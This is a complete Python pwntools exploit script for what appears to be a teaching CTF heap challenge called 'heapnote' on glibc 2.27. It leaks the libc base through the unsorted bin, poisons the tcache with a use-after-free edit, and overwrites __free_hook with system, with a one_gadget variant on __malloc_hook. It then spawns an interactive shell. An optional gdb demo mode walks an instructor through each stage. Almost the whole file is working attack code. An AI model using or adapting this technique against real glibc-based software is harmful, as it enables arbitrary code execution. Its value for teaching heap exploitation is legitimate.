#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
C3 - UAF-Edit tcache poisoning -> __free_hook -> system  (one_gadget alt)
========================================================================
Target  : ./heapnote  (glibc 2.27, -no-pie, partial RELRO)
Goal    : same as C2 (shell via __free_hook), but the POISONING VECTOR is
          a single use-after-free + Edit instead of a double-free. This is
          the "cleaner" primitive that generalizes to glibc versions where
          double-free is detected (2.29+ tcache key).
Leak    : unsorted bin (reused from C2).

Why UAF-Edit is "better" than double-free
-----------------------------------------
* Double-free needs two frees of the same chunk -> trips the tcache key
  check on 2.29+. UAF-Edit only frees ONCE, then edits the dangling
  pointer -> no double-free signature at all.
* The only constraint is the tcache count: to pop victim-then-target we
  need counts >= 2. Here we free TWO distinct chunks (not the same one
  twice), so counts=2 with no self-loop and no double-free detection.

one_gadget alternative (documented, off by default)
----------------------------------------------------
Instead of system + "/bin/sh", overwrite __free_hook (or __malloc_hook)
with a one_gadget. Run:  one_gadget glibc-2.27/libc-2.27.so
and paste a working gadget + its constraint below. one_gadget relies on
stack-state constraints, so the instructor MUST pre-test which gadget
fires from the menu. system+"/bin/sh" is the reliable default.

Run
---
    cd challenges && python3 c3_uaf_poison/exp.py
"""

from pwn import *
import sys

# --demo: attach pwndbg in a tmux split pane. `break menu` stops the proc after
# every command with a clean pwndbg prompt (no Ctrl-C needed). At each DEMO hint
# run the named pwndbg command in the gdb pane, then `continue` there to advance.
# Without --demo the script runs straight to a shell (default; pipe-friendly).
DEMO = "--demo" in sys.argv

context.binary = exe = ELF("./heapnote")
libc = ELF("./glibc-2.27/libc-2.27.so")
context.log_level = "info"

p = process("./heapnote")

# ---- live demo support (gdb/pwndbg + tmux) ----------------------------------
# Run inside tmux:  python3 c3_uaf_poison/exp.py --demo
# pwndbg attaches in a right-hand pane with `break menu`: the proc stops after
# every command, so you get a real pwndbg prompt to run `tcache`/`p &__free_hook`.
# Inspect at each DEMO hint, then `continue` in the gdb pane to advance.
def demo_hint(msg: str):
    if DEMO:
        log.info("DEMO | %s", msg)

if DEMO:
    context.terminal = ["tmux", "splitw", "-h", "-p", "55"]
    gdb.attach(p, gdbscript="break menu\ncontinue\n")
    demo_hint("gdb attached (right pane). Proc stops after each command; inspect, then `continue` to advance.")

# ---- menu helpers -----------------------------------------------------------
def add(idx: int, size: int, data: bytes):
    p.sendlineafter(b"> ", b"1")
    p.sendlineafter(b"idx: ", str(idx).encode())
    p.sendlineafter(b"size: ", str(size).encode())
    p.sendafter(b"data: ", data)

def delete(idx: int):
    p.sendlineafter(b"> ", b"2")
    p.sendlineafter(b"idx: ", str(idx).encode())

def edit(idx: int, length: int, data: bytes):
    p.sendlineafter(b"> ", b"3")
    p.sendlineafter(b"idx: ", str(idx).encode())
    p.sendlineafter(b"len: ", str(length).encode())
    p.sendafter(b"data: ", data)

def show(idx: int) -> bytes:
    p.sendlineafter(b"> ", b"4")
    p.sendlineafter(b"idx: ", str(idx).encode())
    p.recvuntil(b"data=")
    return p.recvuntil(b"\n", drop=True)

# ---- toggle: True = try one_gadget, False = reliable system+"/bin/sh" ------
USE_ONE_GADGET = False
# Pre-tested on 2.27-3ubuntu1.6 from the menu context. Replace if your
# pinned libc differs (run `one_gadget libc-2.27.so` and pick a passing one).
ONE_GADGET = 0x4f322   # constraint: [rsp+0x40] == NULL

# ===========================================================================
# STAGE 1 - leak libc base (same as C2)
# ===========================================================================
BIG = 0x418
add(0, BIG, b"A" * 8)
add(1, 0x18, b"GUARD")
delete(0)
leak = u64(show(0)[:8].ljust(8, b"\x00"))
main_arena = libc.symbols["__malloc_hook"] + 0x10
libc.address = leak - main_arena - 96
log.success("libc base = %#x", libc.address)

system    = libc.symbols["system"]
free_hook = libc.symbols["__free_hook"]
binsh     = next(libc.search(b"/bin/sh\x00"))

# ===========================================================================
# STAGE 2 - UAF-Edit poisoning (NO double-free)
# ===========================================================================
SZ = 0x68
add(2, SZ, b"a" * 8)
add(3, SZ, b"b" * 8)
delete(3)        # head=3, counts=1
delete(2)        # head=2 -> 3, counts=2  (two DIFFERENT chunks: no double-free)
demo_hint("run: tcache | 0x70 bin 2->3, counts=2 (NO self-loop -- contrast C1)")
# UAF-Edit the HEAD (note 2): its data overlaps the freed chunk's fd.
if USE_ONE_GADGET:
    target = free_hook if False else libc.symbols["__malloc_hook"]
    payload_val = libc.address + ONE_GADGET
    edit(2, 8, p64(payload_val))
    log.info("poisoned fd -> __malloc_hook = one_gadget %#x", payload_val)
    demo_hint("run: tcache | head's fd -> __malloc_hook (one_gadget)")
else:
    edit(2, 8, p64(free_hook))
    log.info("poisoned fd -> __free_hook")
    demo_hint("run: tcache | head's fd -> __free_hook")

add(4, SZ, b"PAD")                       # malloc #1: returns chunk-2
if USE_ONE_GADGET:
    add(5, SZ, p64(libc.address + ONE_GADGET))  # malloc #2: returns __malloc_hook
    log.success("__malloc_hook = one_gadget")
    demo_hint("run: p &__malloc_hook | value == one_gadget; continue in gdb to trigger malloc")
    # trigger via malloc: any Add calls malloc -> hook fires -> one_gadget
    p.sendlineafter(b"> ", b"1")
    p.sendlineafter(b"idx: ", b"8")
    p.sendlineafter(b"size: ", b"0x18")
    # one_gadget fires inside malloc, before it asks for data
else:
    add(5, SZ, p64(system))              # malloc #2: returns __free_hook
    log.success("__free_hook = system")
    demo_hint("run: p &__free_hook | value == system")
    add(6, SZ, b"/bin/sh\x00")
    delete(6)                            # free("/bin/sh") -> system
    log.success("shell popped")

p.interactive()
